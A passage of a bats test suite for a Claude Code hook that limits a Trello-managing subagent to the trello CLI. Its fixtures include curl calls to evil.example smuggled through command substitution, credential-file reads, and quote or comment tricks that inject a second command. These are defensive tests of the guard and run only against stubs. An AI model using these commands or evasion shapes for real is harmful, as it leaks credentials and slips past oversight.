#!/usr/bin/env bats
# Tests for hooks/trello-manager-cli-guard.sh — a PreToolUse (Bash matcher)
# hook that enforces trello-manager's own declared boundary: it may only
# reach Trello through the trello CLI, never by hitting the REST API
# directly or reading its credential file.
#
# Pure bats: bats-support/bats-assert/bats-file are not installed in this
# environment (see hooks/tests/prompt-file-guard.bats for the same
# fallback), so assertions use plain bash/jq instead of those libraries.
#
# This hook never shells out to a real network tool (curl, wget, ...) or to
# the real trello CLI itself — is_allowed_command() only inspects the
# command string, it never executes it. So most of this suite needs no PATH
# guarding. There are two exceptions:
#   1. The jq-absent fail-open test, which prefixes a stub dir onto PATH to
#      make jq unresolvable while keeping bash resolvable (bash and jq live
#      in the same real directory on dev/CI machines, so simply dropping
#      jq's directory would break the hook's own "#!/usr/bin/env bash"
#      shebang too); that test proves its own filtering actually removed
#      jq, every run, before trusting the rest of it.
#   2. The differential tests (#58-#61), which hand command strings to a
#      real bash and zsh via `eval` to compare what the shell runs with what
#      the hook decided. The shell under test gets the stub directory as
#      its ONLY PATH entry (stub trello records calls, stub pwned drops a
#      marker), so no real trello or other program can be reached; see
#      "Differential testing" below for how that guard is derived.

HOOK="${BATS_TEST_DIRNAME}/../trello-manager-cli-guard.sh"

# Pipe an arbitrary raw string to the hook's stdin.
run_hook_raw() {
  printf '%s' "$1" | "$HOOK"
}

# Build a well-formed JSON payload for the hook's stdin.
# $1=command  $2=agent_id (omit/empty for no agent_id key)
# $3=agent_type (omit/empty for no agent_type key)
build_payload() {
  local command="$1" agent_id="${2:-}" agent_type="${3:-}"
  jq -n --arg cmd "$command" --arg aid "$agent_id" --arg atype "$agent_type" '
    {tool_name: "Bash", tool_input: {command: $cmd}}
    + (if $aid != "" then {agent_id: $aid} else {} end)
    + (if $atype != "" then {agent_type: $atype} else {} end)
  '
}

# Assert the most recent `run` produced a well-formed deny decision: exit 0,
# valid JSON, correct hookEventName/permissionDecision, and a non-empty
# reason that mentions trello (so the model is pointed at the CLI).
assert_deny() {
  local reason
  [ "$status" -eq 0 ]
  [ -n "$output" ]
  jq -e . >/dev/null <<< "$output"
  [ "$(jq -r '.hookSpecificOutput.hookEventName' <<< "$output")" = "PreToolUse" ]
  [ "$(jq -r '.hookSpecificOutput.permissionDecision' <<< "$output")" = "deny" ]
  reason="$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")"
  [ -n "$reason" ]
  [[ "$reason" == *"trello"* ]]
}

# Assert the most recent `run` stayed silent: exit 0, empty stdout.
assert_silent() {
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

# Run the hook as trello-manager on command string $1.
run_as_trello_manager() {
  run run_hook_raw "$(build_payload "$1" "a1" "trello-manager")"
}

# Print the deny reason from the hook output passed as $1.
deny_reason() {
  jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$1"
}

# Single-quote $1 for a shell: wrap in '...' and write each ' as '\''.
sq() {
  local q="'"
  printf "'%s'" "${1//$q/$q\\$q$q}"
}

# Print $1 repeated $2 times (by doubling, so large counts stay fast).
repeat_str() {
  local s="$1" n="$2" out=""
  while [ "$n" -gt 0 ]; do
    if [ $((n & 1)) -eq 1 ]; then out+="$s"; fi
    s+="$s"
    n=$((n >> 1))
  done
  printf '%s' "$out"
}

# --- Differential testing against the real shells --------------------------
# The hook only reads the command string, so these helpers hand the same
# string to the shells Claude Code (bash, and zsh with its setopts) would
# use and check what actually ran. The shell under test gets PATH set to the
# stub directory ALONE: the only external commands it can resolve are the
# stubs, so nothing can fall through to the real /usr/bin/trello (which is
# installed on dev machines) or any other real program. That makes the
# guard list-free by construction; setup_diff_env additionally derives, from
# the stub directory's own contents, that every stub name resolves to its
# stub. The tests then assert on the stubs' effects (trello called, pwned
# marker), so deleting a stub makes the sections below fail.

# Build the stub dir. trello records one line per call plus its last
# argument; pwned drops a marker file. Only shell builtins are used, so the
# stubs work with PATH containing nothing else.
# shellcheck disable=SC2016 # the stub bodies are emitted as literal text.
setup_diff_env() {
  local f name resolved
  real_bash="$(command -v bash)"
  stub_dir="$BATS_TEST_TMPDIR/stubs"
  rec_dir="$BATS_TEST_TMPDIR/rec"
  mkdir -p "$stub_dir" "$rec_dir"
  {
    printf '#!%s\n' "$real_bash"
    printf 'printf "x\\n" >> %q\n' "$rec_dir/calls"
    printf 'printf "%%s" "${@: -1}" > %q\n' "$rec_dir/last_arg"
  } > "$stub_dir/trello"
  {
    printf '#!%s\n' "$real_bash"
    printf ': > %q\n' "$rec_dir/pwned"
  } > "$stub_dir/pwned"
  chmod +x "$stub_dir"/*
  # Guard: every stub resolves to itself under the stub-only PATH.
  for f in "$stub_dir"/*; do
    name="${f##*/}"
    resolved="$(PATH="$stub_dir" "$real_bash" -c 'command -v "$1"' _ "$name")"
    [ "$resolved" = "$f" ]
  done
}

# Called first by every zsh differential test. Without zsh the test is
# skipped, except in CI (CI non-empty), where the workflow installs zsh: a
# missing zsh there means the comparison silently stopped running, so it
# fails instead.
require_zsh() {
  command -v zsh > /dev/null && return 0
  if [ -n "${CI:-}" ]; then
    echo "# zsh is missing but CI is set (ci.yml installs it): the zsh differential comparison would silently not run" >&3
    return 1
  fi
  skip "zsh is not installed: cannot compare against the shell Claude Code actually runs commands in"
}

# Run command string $2 through `eval` in shell $1 (bash | zsh), mirroring
# how Claude Code executes a Bash tool command (zsh with the same setopts),
# with a clean record dir and PATH holding only the stubs.
run_in_shell() {
  rm -f "$rec_dir"/*
  case "$1" in
    bash)
      # shellcheck disable=SC2016 # $1 must reach the inner shell unexpanded
      PATH="$stub_dir" "$real_bash" -c 'eval "$1"' _ "$2" > /dev/null 2>&1 || true
      ;;
    zsh)
      # shellcheck disable=SC2016 # $1 must reach the inner shell unexpanded
      PATH="$stub_dir" "$(command -v zsh)" -f -c 'setopt NO_EXTENDED_GLOB NO_BARE_GLOB_QUAL; eval "$1"' _ "$2" > /dev/null 2>&1 || true
      ;;
  esac
}

# Fill FIX_CMDS / FIX_EXPECT with the "must be allowed" fixtures: each is a
# command string and the exact last argument trello must receive from it.
build_allowed_fixtures() {
  local body
  FIX_CMDS=()
  FIX_EXPECT=()

  body="$(cat <<'EOF'
see `README.md` and `npm test`
EOF
)"
  FIX_CMDS+=("trello card:update --id abc --description $(sq "$body")")
  FIX_EXPECT+=("$body")

  body="$(cat <<'EOF'
costs $5, see $(not run) and ${HOME}
EOF
)"
  FIX_CMDS+=("trello card:update --id abc --description $(sq "$body")")
  FIX_EXPECT+=("$body")

  body="$(cat <<'EOF'
# Title

```bash
make build; make test && echo ok || echo fail
```

> quoted text
EOF
)"
  FIX_CMDS+=("trello card:update --id abc --description $(sq "$body")")
  FIX_EXPECT+=("$body")

  body="$(cat <<'EOF'
a -> b

| col | col |
| --- | --- |
| x | y |
EOF
)"
  FIX_CMDS+=("trello card:update --id abc --description $(sq "$body")")
  FIX_EXPECT+=("$body")

  body="$(cat <<'EOF'
it's Eddie's card; don't panic & (really)
EOF
)"
  FIX_CMDS+=("trello card:update --id abc --description $(sq "$body")")
  FIX_EXPECT+=("$body")

  FIX_CMDS+=('trello card:comment --id abc --text "it'"'"'s fine (ok) -> yes"')
  FIX_EXPECT+=("it's fine (ok) -> yes")
}

# Fill C1_PAYLOADS with the comment-desync payloads: each hides a quote (or a
# backslash before the newline) in a # comment so that a quote-tracking
# scanner and the real shell disagree about where the second line starts.
build_comment_payloads() {
  C1_PAYLOADS=(
    $'trello x # \'\npwned #\''
    $'trello x # "\npwned #"'
    $'trello x #\\\npwned'
    $'trello x # \\\npwned'
  )
}

# For shell $1: every allowed fixture is accepted by the hook AND the shell
# runs it as exactly one trello call whose last argument is byte-identical
# to the intended text, with no pwned marker.
assert_allowed_fixtures_in_shell() {
  local shell="$1" i
  setup_diff_env
  build_allowed_fixtures
  for i in "${!FIX_CMDS[@]}"; do
    run_as_trello_manager "${FIX_CMDS[$i]}"
    assert_silent
    run_in_shell "$shell" "${FIX_CMDS[$i]}"
    if [ -e "$rec_dir/pwned" ] \
      || [ "$(wc -l < "$rec_dir/calls")" -ne 1 ] \
      || [ "$(< "$rec_dir/last_arg")" != "${FIX_EXPECT[$i]}" ]; then
      echo "# differential mismatch in $shell for fixture $i: ${FIX_CMDS[$i]}" >&3
      return 1
    fi
  done
}

# For shell $1: every comment-desync payload is denied by the hook, and the
# shell really does run pwned for it (proving the payload is dangerous and
# the stub-based check can tell).
assert_comment_payloads_in_shell() {
  local shell="$1" payload
  setup_diff_env
  build_comment_payloads
  for payload in "${C1_PAYLOADS[@]}"; do
    run_as_trello_manager "$payload"
    assert_deny
    [[ "$(deny_reason "$output")" == *"「#」"* ]]
    run_in_shell "$shell" "$payload"
    if [ ! -e "$rec_dir/pwned" ]; then
      echo "# $shell did not run pwned for payload: $payload" >&3
      return 1
    fi
  done
}

@test "1: trello-manager running curl directly is denied" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards" "a1" "trello-manager")"
  assert_deny
}

@test "2: trello-manager running a plain trello command is allowed" {
  run run_hook_raw "$(build_payload "trello card:list --board X --list Y" "a1" "trello-manager")"
  assert_silent
}

@test "3: trello-manager running the documented cache-check idiom is allowed" {
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "cache exists, skip sync" || trello sync' "a1" "trello-manager")"
  assert_silent
}

@test "4: trello-manager running wget to reach the API is denied" {
  run run_hook_raw "$(build_payload "wget https://api.trello.com/1/boards" "a1" "trello-manager")"
  assert_deny
}

@test "5: trello-manager running python3 -c to reach the API is denied" {
  run run_hook_raw "$(build_payload "python3 -c \"import requests; requests.get('https://api.trello.com')\"" "a1" "trello-manager")"
  assert_deny
}

@test "6: trello-manager running node -e to reach the API is denied" {
  run run_hook_raw "$(build_payload "node -e \"require('https').get('https://api.trello.com')\"" "a1" "trello-manager")"
  assert_deny
}

@test "7: trello-manager wrapping curl in sh -c is denied" {
  run run_hook_raw "$(build_payload 'sh -c "curl https://api.trello.com"' "a1" "trello-manager")"
  assert_deny
}

@test "8: trello-manager reading the credential file with cat is denied" {
  run run_hook_raw "$(build_payload "cat ~/.trello-cli/default/config.json" "a1" "trello-manager")"
  assert_deny
}

@test "9: trello-manager reading the credential file with sed is denied" {
  run run_hook_raw "$(build_payload "sed -n '1p' ~/.trello-cli/default/config.json" "a1" "trello-manager")"
  assert_deny
}

@test "10: main-thread curl (no agent_id) is allowed" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards")"
  assert_silent
}

@test "11: a different subagent's curl is allowed" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards" "a1" "some-other-agent")"
  assert_silent
}

@test "12: malformed JSON on stdin stays silent (identity cannot be determined)" {
  run run_hook_raw 'not valid json{'
  assert_silent
}

@test "13: trello-manager call missing tool_input.command entirely is denied" {
  run run_hook_raw '{"tool_name":"Bash","agent_id":"a1","agent_type":"trello-manager","tool_input":{}}'
  assert_deny
}

@test "14: trello-manager chaining a real trello call with curl via && is denied" {
  run run_hook_raw "$(build_payload "trello sync && curl https://evil.example" "a1" "trello-manager")"
  assert_deny
}

@test "15: trello-manager chaining a real trello call with curl via ; is denied" {
  run run_hook_raw "$(build_payload "trello sync; curl https://evil.example" "a1" "trello-manager")"
  assert_deny
}

@test "16: trello-manager piping a trello call into another command is denied" {
  run run_hook_raw "$(build_payload "trello card:list --board X --list Y | grep foo" "a1" "trello-manager")"
  assert_deny
}

@test "17: trello-manager smuggling curl via command substitution is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "$(curl https://evil.example)"' "a1" "trello-manager")"
  assert_deny
}

@test "18: trello-manager smuggling curl via backticks is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "`curl https://evil.example`"' "a1" "trello-manager")"
  assert_deny
}

@test "19: the word trello appearing only as a curl argument is denied" {
  run run_hook_raw "$(build_payload 'curl -X POST -d "service=trello" https://evil.example' "a1" "trello-manager")"
  assert_deny
}

@test "20: a cache-idiom lookalike with an injected extra command is denied" {
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "x" && curl https://evil.example || trello sync' "a1" "trello-manager")"
  assert_deny
}

@test "21: a cache-idiom lookalike with command substitution in the echo message is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "$(curl https://evil.example)" || trello sync' "a1" "trello-manager")"
  assert_deny
}

@test "22: a lookalike name (trellocorp) is not mistaken for the trello CLI" {
  run run_hook_raw "$(build_payload "trellocorp sync" "a1" "trello-manager")"
  assert_deny
}

@test "23: agent_id present but agent_type absent is treated as unconfirmed and allowed" {
  run run_hook_raw '{"tool_name":"Bash","agent_id":"a1","tool_input":{"command":"curl https://api.trello.com"}}'
  assert_silent
}

@test "24: trello-manager redirecting output with > is denied" {
  run run_hook_raw "$(build_payload "trello sync > /tmp/out" "a1" "trello-manager")"
  assert_deny
}

@test "25: trello-manager redirecting input with < is denied" {
  run run_hook_raw "$(build_payload "trello card:list < /etc/passwd" "a1" "trello-manager")"
  assert_deny
}

@test "26: trello-manager running trello interactive is denied" {
  run run_hook_raw "$(build_payload "trello interactive" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"interactive"* ]]
}

@test "27: trello-manager running a quoted trello \"interactive\" is still denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello "interactive"' "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"interactive"* ]]
}

@test "28: trello-manager setting the API key via auth:api-key is denied" {
  run run_hook_raw "$(build_payload "trello auth:api-key SOME_SECRET_VALUE" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"auth:api-key"* ]]
}

@test "29: trello-manager setting the token via auth:token is denied" {
  run run_hook_raw "$(build_payload "trello auth:token SOME_SECRET_VALUE" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"auth:token"* ]]
}

@test "30: the words interactive and auth appearing only as argument content (not the subcommand position) are allowed" {
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "switch to interactive mode after auth:token rotation"' "a1" "trello-manager")"
  assert_silent
}

@test "31: jq absent from PATH makes the hook silently allow (fail open), and the PATH filtering that proves it is checked every run" {
  local payload saved_path stub_dir entry filtered_path

  # Build the payload while jq is still reachable — build_payload itself
  # shells out to the real jq.
  payload="$(build_payload "curl https://api.trello.com/1/boards" "a1" "trello-manager")"

  saved_path="$PATH"

  # Stub dir holding only a symlink to the real bash, so the hook's own
  # "#!/usr/bin/env bash" shebang still resolves once jq's directory is
  # dropped from PATH below (bash and jq live in the same directory here).
  stub_dir="$BATS_TEST_TMPDIR/bash-only"
  mkdir -p "$stub_dir"
  ln -s "$(command -v bash)" "$stub_dir/bash"

  filtered_path=""
  while IFS= read -r entry; do
    [ -n "$entry" ] || continue
    [ -x "$entry/jq" ] && continue
    filtered_path="${filtered_path:+$filtered_path:}$entry"
  done < <(printf '%s\n' "${PATH//:/$'\n'}")
  PATH="$stub_dir:$filtered_path"

  # Prove the filtered PATH actually makes jq unresolvable before trusting
  # the rest of this test — otherwise a jq install this filter missed would
  # let this test pass for the wrong reason (exercising the jq-present
  # path, not the fail-open branch under test).
  run command -v jq
  [ "$status" -ne 0 ]

  run run_hook_raw "$payload"
  PATH="$saved_path"
  assert_silent
}

@test "32: a harmless non-trello diagnostic (command -v trello) gets a mechanism-accurate reason, not the API-bypass wording" {
  # Regression guard for a real end-to-end finding: trello-manager ran
  # `command -v trello` (a diagnostic that touches neither the API-bypass
  # nor the credential-read boundary), was correctly denied, but the reason
  # text used to describe only those two scenarios — leading the model to
  # wrongly conclude that `command`/`which` were blacklisted by name. The
  # fix folded the API-bypass/credential-read wording and the shape-mismatch
  # mechanism into one reason (SHAPE_MISMATCH_REASON), so this asserts the
  # mechanism statement and the concrete command -v example are present;
  # it goes red if that statement is ever dropped back to the old
  # examples-only wording.
  run run_hook_raw "$(build_payload "command -v trello" "a1" "trello-manager")"
  assert_deny
  local reason
  reason="$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")"
  [[ "$reason" == *"與指令名稱本身無關"* ]]
  [[ "$reason" == *"command -v trello"* ]]
}

# --- Quote-aware scan of shape (a) ----------------------------------------
# Free text (Markdown descriptions, comments) reaches trello-cli only as a
# --description=<value> style argument, so it must be passable inside single
# quotes with any character. Fixtures that need literal quotes/newlines are
# built with a quoted heredoc so nothing in them is expanded by the test.
# (Helpers used by these tests live next to assert_silent at the top of the
# file, so shellcheck sees them defined before any test modifies $output.)

@test "33: single-quoted description containing backticks is allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:update --id abc --description 'see `README.md` and `npm test`'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "34: single-quoted description containing \$, \$(...) and \${...} is allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:update --id abc --description 'costs $5, see $(not run) and ${HOME}'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "35: single-quoted multi-line Markdown with a code fence, ;, >, && and || is allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:update --id abc --description '# Title

```bash
make build; make test && echo ok || echo fail
```

> quoted text'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "36: single-quoted arrows and Markdown table rows are allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:update --id abc --description 'a -> b

| col | col |
| --- | --- |
| x | y |'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "37: apostrophes written as '\\'' inside a single-quoted description are allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:update --id abc --description 'it'\''s Eddie'\''s card; don'\''t panic & (really)'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "38: ordinary double-quoted text with an apostrophe, parens and an arrow is allowed" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:comment --id abc --text "it's fine (ok) -> yes"
EOF
)"
  run_as_trello_manager "$cmd"
  assert_silent
}

@test "39: escaped-quote bypass (trello x \\'; pwned; \\') is denied with the unquoted-character reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello x \'; pwned; \'
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"引號外"* ]]
  [[ "$(deny_reason "$output")" == *"「;」"* ]]
}

@test "40: apostrophe inside double quotes followed by an unquoted ; is denied" {
  local cmd
  cmd="$(cat <<'EOF'
trello x "it's" ; pwned ; echo '
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"「;」"* ]]
}

@test "41: a ; after a closed single-quoted string is denied" {
  local cmd
  cmd="$(cat <<'EOF'
trello x 'a' ; pwned
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"「;」"* ]]
}

@test "42: an unclosed single quote is denied with the unclosed-quote reason" {
  run_as_trello_manager "trello x 'abc"
  assert_deny
  [[ "$(deny_reason "$output")" == *"未閉合"* ]]
}

@test "43: a real newline outside quotes is denied and the reason calls it a newline" {
  run_as_trello_manager $'trello x\npwned'
  assert_deny
  [[ "$(deny_reason "$output")" == *"換行"* ]]
  [[ "$(deny_reason "$output")" == *"單引號"* ]]
}

@test "44: a newline inside double quotes followed by \$(...) is denied with the double-quote reason" {
  local cmd
  cmd="trello x \"a"$'\n$(pwned)"'
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"雙引號"* ]]
  [[ "$(deny_reason "$output")" == *"單引號"* ]]
}

@test "45: a zsh glob qualifier *(e:pwned:) is denied (parentheses outside quotes)" {
  run_as_trello_manager 'trello x *(e:pwned:)'
  assert_deny
  [[ "$(deny_reason "$output")" == *"「(」"* ]]
}

@test "46: an escaped backslash does not escape the following ; (trello x \\\\; pwned) is denied" {
  local cmd
  cmd="$(cat <<'EOF'
trello x \\; pwned
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"「;」"* ]]
}

@test "47: ANSI-C quoting (\$'\\x3b') is denied because of the unquoted \$" {
  local cmd
  cmd="$(cat <<'EOF'
trello x $'\x3b' pwned
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"「\$」"* ]]
}

@test "48: a lone & (background operator) is denied" {
  run_as_trello_manager "trello x & pwned"
  assert_deny
  [[ "$(deny_reason "$output")" == *"「&」"* ]]
}

@test "49: trello plugins:install is denied with a plugins-specific reason" {
  run_as_trello_manager "trello plugins:install some-pkg"
  assert_deny
  [[ "$(deny_reason "$output")" == *"plugins"* ]]
  [[ "$(deny_reason "$output")" == *"任意程式碼"* ]]
}

@test "50: bare trello plugins is denied with a plugins-specific reason" {
  run_as_trello_manager "trello plugins"
  assert_deny
  [[ "$(deny_reason "$output")" == *"任意程式碼"* ]]
}

@test "51: trello plugins:link is denied with a plugins-specific reason" {
  run_as_trello_manager "trello plugins:link /tmp/x"
  assert_deny
  [[ "$(deny_reason "$output")" == *"任意程式碼"* ]]
}

@test "52: a backslash-spliced subcommand (plu\\gins:install) is denied with the subcommand-token reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello plu\gins:install x
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"子指令位置"* ]]
}

@test "53: a quote-spliced subcommand (int\"eractive\") is denied with the subcommand-token reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello int"eractive"
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"子指令位置"* ]]
}

@test "54: a backslash-spliced subcommand (au\\th:token) is denied with the subcommand-token reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello au\th:token x
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"子指令位置"* ]]
}

@test "55: an empty quoted subcommand token ('' auth:token) is denied with the subcommand-token reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello '' auth:token
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"子指令位置"* ]]
}

@test "56: a bare trello with no subcommand token is still allowed" {
  run_as_trello_manager "trello"
  assert_silent
}

@test "57: the shape-mismatch reason describes the new quoting rule and keeps the shape-not-name explanation" {
  run_as_trello_manager "command -v trello"
  assert_deny
  [[ "$(deny_reason "$output")" == *"單引號內可含任何字元"* ]]
  [[ "$(deny_reason "$output")" == *"與指令名稱本身無關"* ]]
}

@test "58: differential (bash): allowed fixtures run as exactly one trello call with the exact text, and nothing else" {
  assert_allowed_fixtures_in_shell bash
}

@test "59: differential (zsh with Claude Code's setopts): same fixtures, same result" {
  require_zsh
  assert_allowed_fixtures_in_shell zsh
}

@test "60: differential (bash): the comment-desync payloads are denied although bash really runs pwned" {
  assert_comment_payloads_in_shell bash
}

@test "61: differential (zsh): the comment-desync payloads are denied although zsh really runs pwned" {
  require_zsh
  assert_comment_payloads_in_shell zsh
}

@test "62: each comment-desync payload is denied with the # reason that points at single quotes" {
  local payload
  build_comment_payloads
  for payload in "${C1_PAYLOADS[@]}"; do
    run_as_trello_manager "$payload"
    assert_deny
    [[ "$(deny_reason "$output")" == *"註解"* ]]
    [[ "$(deny_reason "$output")" == *"單引號"* ]]
  done
}

@test "63: a backtick inside double quotes is denied with the double-quote reason" {
  local cmd
  cmd="$(cat <<'EOF'
trello card:comment --id 1 --text "see `README.md`"
EOF
)"
  run_as_trello_manager "$cmd"
  assert_deny
  [[ "$(deny_reason "$output")" == *"雙引號"* ]]
  [[ "$(deny_reason "$output")" == *"「\`」"* ]]
  [[ "$(deny_reason "$output")" == *"單引號"* ]]
}

@test "64: an unclosed double quote is denied with the unclosed-quote reason" {
  run_as_trello_manager 'trello card:comment --id 1 --text "abc'
  assert_deny
  [[ "$(deny_reason "$output")" == *"未閉合"* ]]
}

@test "65: a fully double-quoted forbidden subcommand (\"plugins:install\") is denied as plugins" {
  run_as_trello_manager 'trello "plugins:install" x'
  assert_deny
  [[ "$(deny_reason "$output")" == *"任意程式碼"* ]]
}

@test "66: a fully single-quoted forbidden subcommand ('auth:token') is denied as auth:token" {
  run_as_trello_manager "trello 'auth:token' x"
  assert_deny
  [[ "$(deny_reason "$output")" == *"auth:token"* ]]
}

@test "67: leading flags before a subcommand-looking word are allowed (locks in the reliance on trello-cli/oclif treating the first token as the command name)" {
  # trello-cli (oclif) answers `trello --format json plugins` with
  # "command --format not found" (verified against 2.0.0), so `plugins` is
  # never dispatched. This test documents that the hook allows these on
  # that basis; see the comment in is_allowed_command.
  run_as_trello_manager "trello -- plugins"
  assert_silent
  run_as_trello_manager "trello --format json plugins"
  assert_silent
}

@test "68: a lone trailing backslash is harmless and stays allowed" {
  run_as_trello_manager "trello x \\"
  assert_silent
}

@test "69: quotes, backslashes and specials straddling the scanner's 512-byte chunk boundary are judged correctly" {
  local pad p
  for pad in $(seq 500 515); do
    p="$(repeat_str a "$pad")"
    # Allowed: escaped ; , ; inside single quotes, escaped quote inside double quotes.
    run_as_trello_manager "trello x $p\\;b"
    assert_silent
    run_as_trello_manager "trello x '$p;y'"
    assert_silent
    run_as_trello_manager "trello x \"$p\\\"y\""
    assert_silent
    # Denied: an escaped backslash does not escape the ;, closed quote then ;,
    # unclosed quote, escaped quote then live $ in double quotes.
    run_as_trello_manager "trello x $p\\\\;b"
    assert_deny
    run_as_trello_manager "trello x '$p' ; y"
    assert_deny
    run_as_trello_manager "trello x $p'"
    assert_deny
    run_as_trello_manager "trello x \"$p\\\"\$\""
    assert_deny
  done
  # Same shapes with 3-byte CJK padding, so a multibyte character is cut by
  # the chunk boundary and is immediately followed by ; or a quote.
  for pad in $(seq 164 172); do
    p="$(repeat_str 中 "$pad")"
    run_as_trello_manager "trello x '${p};y'"
    assert_silent
    run_as_trello_manager "trello x \"$p\\\"y\""
    assert_silent
    run_as_trello_manager "trello x ${p};y"
    assert_deny
    run_as_trello_manager "trello x '$p' ; y"
    assert_deny
    run_as_trello_manager "trello x $p'"
    assert_deny
  done
}

@test "70: a command over 65536 bytes is denied with the too-long reason, before any scanning" {
  run_as_trello_manager "trello card:update --id abc --description '$(repeat_str a 65600)'"
  assert_deny
  [[ "$(deny_reason "$output")" == *"過長"* ]]
}

@test "71: the 65536-byte limit counts bytes, not characters, and is inclusive" {
  local cmd
  cmd="trello x '$(repeat_str a 65525)'"
  [ "${#cmd}" -eq 65536 ]
  run_as_trello_manager "$cmd"
  assert_silent
  # 21846 CJK characters are 65538 bytes but far fewer characters.
  run_as_trello_manager "trello x '$(repeat_str 中 21846)'"
  assert_deny
  [[ "$(deny_reason "$output")" == *"過長"* ]]
}

@test "72: a 30KB single-quoted CJK/ASCII description is allowed quickly in a UTF-8 locale" {
  local unit body start
  unit="$(cat <<'EOF'
中文描述 mixed ASCII `code` $5 -> ok; done.
EOF
)"$'\n'
  body="$(repeat_str "$unit" 450)"
  start=$SECONDS
  LC_ALL=C.UTF-8 run_as_trello_manager "trello card:update --id abc --description $(sq "$body")"
  assert_silent
  # The old per-character scan took ~10s here; the real figure is well under a second.
  [ $((SECONDS - start)) -lt 4 ]
}

@test "73: ~60KB of dense quote-state transitions ('a' repeated) is allowed within the time budget" {
  # Pins the chunked scan: a scan that indexes the whole string per
  # character needs 16-18s for this shape, the chunked one under 1s.
  local cmd start
  cmd="trello x $(repeat_str "'a'" 20000)"
  start=$SECONDS
  run_as_trello_manager "$cmd"
  assert_silent
  [ $((SECONDS - start)) -lt 4 ]
}

@test "74: ~60KB of escapes inside double quotes (\\a repeated) is allowed within the time budget" {
  # Same purpose as #73 for the double-quote state (12-13s unchunked).
  local cmd start
  cmd="trello x \"$(repeat_str '\a' 30000)\""
  start=$SECONDS
  run_as_trello_manager "$cmd"
  assert_silent
  [ $((SECONDS - start)) -lt 4 ]
}

@test "75: an invisible character in the subcommand token is shown escaped in the reason" {
  run_as_trello_manager $'trello x\r'
  assert_deny
  [[ "$(deny_reason "$output")" == *"子指令位置"* ]]
  [[ "$(deny_reason "$output")" == *"\$'x\\r'"* ]]
}

@test "76: the # reason says a # starts a comment at the start of a word, and the generic reason shows the '\\'' escape" {
  run_as_trello_manager 'trello x #y'
  assert_deny
  [[ "$(deny_reason "$output")" == *"詞首"* ]]
  run_as_trello_manager "command -v trello"
  assert_deny
  [[ "$(deny_reason "$output")" == *"'\\''"* ]]
}

@test "77: agents/trello-manager.md registers this hook with timeout 10 and onFailure block" {
  # A hook timeout fails OPEN unless onFailure is block, and the length cap
  # and scan speed were sized against the 10s timeout.
  local agent block
  agent="${BATS_TEST_DIRNAME}/../../agents/trello-manager.md"
  [ -f "$agent" ]
  # Frontmatter only, then the hooks-list item that names this script.
  block="$(awk 'NR==1 && /^---$/ {f=1; next} f && /^---$/ {exit} f' "$agent" \
    | awk '/^[[:space:]]*- / { if (hit) printf "%s", blk; blk=""; hit=0 }
           { blk = blk $0 "\n" }
           /trello-manager-cli-guard\.sh/ { hit=1 }
           END { if (hit) printf "%s", blk }')"
  [ -n "$block" ]
